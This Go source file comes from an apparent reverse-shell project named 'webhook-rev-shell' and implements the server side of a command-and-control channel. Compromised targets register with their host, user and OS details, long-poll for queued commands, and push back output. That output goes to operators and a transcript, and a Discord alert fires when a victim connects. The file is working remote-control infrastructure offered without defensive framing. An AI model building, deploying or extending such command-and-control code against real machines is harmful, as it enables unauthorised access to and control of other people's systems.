package transport

import (
	"encoding/json"
	"errors"
	"io"
	"log"
	"net"
	"net/http"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"github.com/noahmagill/webhook-rev-shell/internal/broker"
	"github.com/noahmagill/webhook-rev-shell/internal/notify"
	"github.com/noahmagill/webhook-rev-shell/internal/protocol"
)

const pollTimeout = 30 * time.Second

type PollHandler struct {
	B       *broker.Broker
	Discord *notify.Discord
}

func (h *PollHandler) Register(w http.ResponseWriter, r *http.Request) {
	sessionID := chi.URLParam(r, "id")
	secret := chi.URLParam(r, "secret")

	sess, err := h.B.Store().GetSession(sessionID)
	if err != nil || sess.Secret != secret {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	if sess.State == protocol.StateExpired || sess.State == protocol.StateKilled {
		http.Error(w, "session closed", http.StatusGone)
		return
	}

	var reg protocol.RegisterPayload
	if err := json.NewDecoder(r.Body).Decode(&reg); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	targetID := uuid.New().String()[:8]
	target := &protocol.Target{
		ID:           targetID,
		SessionID:    sessionID,
		Host:         reg.Host,
		User:         reg.User,
		OS:           reg.OS,
		Arch:         reg.Arch,
		System:       reg.System,
		Capabilities: reg.Capabilities,
		Mode:         "command",
		Transport:    "http_poll",
		LastSeen:     time.Now(),
	}

	if _, err := h.B.RegisterTarget(sessionID, target); err != nil {
		if errors.Is(err, broker.ErrSessionHasActiveBeacon) {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusConflict)
			json.NewEncoder(w).Encode(map[string]string{
				"error": "session has active beacon",
			})
			return
		}
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	if h.Discord != nil && h.Discord.Enabled() {
		callbackIP := requestIP(r)
		go func() {
			if err := h.Discord.CallbackConnected(sess, target, callbackIP); err != nil {
				log.Printf("discord callback notify: %v", err)
			}
		}()
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"target_id": targetID,
		"status":    "registered",
	})
}

func (h *PollHandler) Poll(w http.ResponseWriter, r *http.Request) {
	sessionID := chi.URLParam(r, "id")
	secret := chi.URLParam(r, "secret")
	targetID := r.URL.Query().Get("target_id")

	sess, err := h.B.Store().GetSession(sessionID)
	if err != nil || sess.Secret != secret {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	room := h.B.GetRoom(sessionID)
	if room == nil {
		http.Error(w, "no room", http.StatusNotFound)
		return
	}

	val, ok := room.Targets.Load(targetID)
	if !ok {
		http.Error(w, "target not found", http.StatusNotFound)
		return
	}
	tl := val.(*broker.TargetLink)

	h.B.Touch(sessionID)
	tl.Touch()
	if room := h.B.GetRoom(sessionID); room != nil {
		room.TouchClaim(targetID)
	}
	defer tl.Touch()

	timer := time.NewTimer(pollTimeout)
	defer timer.Stop()
	heartbeat := time.NewTicker(5 * time.Second)
	defer heartbeat.Stop()

	for {
		select {
		case cmd := <-tl.CmdQueue:
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Write(cmd)
			return
		case <-timer.C:
			w.WriteHeader(http.StatusNoContent)
			return
		case <-tl.Done:
			http.Error(w, "session closed", http.StatusGone)
			return
		case <-r.Context().Done():
			return
		case <-heartbeat.C:
			tl.Touch()
			if room := h.B.GetRoom(sessionID); room != nil {
				room.TouchClaim(targetID)
			}
		}
	}
}

func (h *PollHandler) Push(w http.ResponseWriter, r *http.Request) {
	sessionID := chi.URLParam(r, "id")
	secret := chi.URLParam(r, "secret")

	sess, err := h.B.Store().GetSession(sessionID)
	if err != nil || sess.Secret != secret {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	room := h.B.GetRoom(sessionID)
	if room == nil {
		http.Error(w, "no room", http.StatusNotFound)
		return
	}

	data, err := io.ReadAll(io.LimitReader(r.Body, 1<<20)) // 1MB max
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	room.Transcript.Write(data)
	room.BroadcastToOperators(data)
	h.B.Touch(sessionID)
	targetID := r.URL.Query().Get("target_id")
	room.TouchClaim(targetID)
	if val, ok := room.Targets.Load(targetID); ok {
		val.(*broker.TargetLink).Touch()
	}

	w.WriteHeader(http.StatusOK)
}

func (h *PollHandler) Event(w http.ResponseWriter, r *http.Request) {
	sessionID := chi.URLParam(r, "id")
	secret := chi.URLParam(r, "secret")

	sess, err := h.B.Store().GetSession(sessionID)
	if err != nil || sess.Secret != secret {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	_ = sess

	room, err := h.B.GetOrLoadRoom(sessionID)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	data, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	room.Transcript.Write(data)
	room.BroadcastToOperators(data)
	h.B.Touch(sessionID)

	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status":"ok"}`))
}

func requestIP(r *http.Request) string {
	if r == nil {
		return ""
	}
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err == nil {
		return host
	}
	return r.RemoteAddr
}
